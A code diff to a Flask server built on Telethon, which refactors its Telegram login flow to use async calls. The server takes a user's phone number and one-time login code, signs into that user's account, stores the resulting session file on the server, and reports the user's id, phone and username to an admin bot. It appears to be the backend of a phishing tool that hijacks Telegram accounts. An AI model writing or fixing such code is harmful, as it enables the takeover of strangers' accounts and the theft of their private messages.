@@ -25,6 +25,15 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
+def run_async(coro):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        return loop.run_until_complete(coro)
+    finally:
+        loop.close()
+
+
 def send_admin_message(text: str):
     async def _send():
         await bot.send_message(ADMIN_ID, text)
@@ -65,20 +74,21 @@ def send_code():
     phone = data.get("phone")
 
     try:
-        if phone in pending:
-            pending[phone]["client"].disconnect()
-            pending.pop(phone)
+        async def work():
+            client = TelegramClient(
+                session_path(phone),
+                API_ID,
+                API_HASH
+            )
+            await client.connect()
+            sent = await client.send_code_request(phone)
 
-        client = TelegramClient(session_path(phone), API_ID, API_HASH)
-        client.connect()
+            pending[phone] = {
+                "client": client,
+                "hash": sent.phone_code_hash
+            }
 
-        sent = client.send_code_request(phone)
-
-        pending[phone] = {
-            "client": client,
-            "hash": sent.phone_code_hash
-        }
-
+        run_async(work())
         return jsonify({"status": "code_sent"})
 
     except FloodWaitError as e:
@@ -90,6 +100,7 @@ def send_code():
     except Exception as e:
         print("SEND CODE ERROR:", e)
         return jsonify({"status": "error"})
+
 
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
@@ -104,7 +115,16 @@ def verify_code():
     phone_hash = pending[phone]["hash"]
 
     try:
-        client.sign_in(phone=phone, code=code, phone_code_hash=phone_hash)
+        async def work():
+            await client.sign_in(
+                phone=phone,
+                code=code,
+                phone_code_hash=phone_hash
+            )
+
+        run_async(work())
+        return finalize_login(client, phone)
+
     except PhoneCodeInvalidError:
         return jsonify({"status": "invalid_code"})
     except SessionPasswordNeededError:
@@ -112,6 +132,7 @@ def verify_code():
     except Exception as e:
         print("VERIFY ERROR:", e)
         return jsonify({"status": "error"})
+
 
     return finalize_login(client, phone)
 
@@ -181,6 +202,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
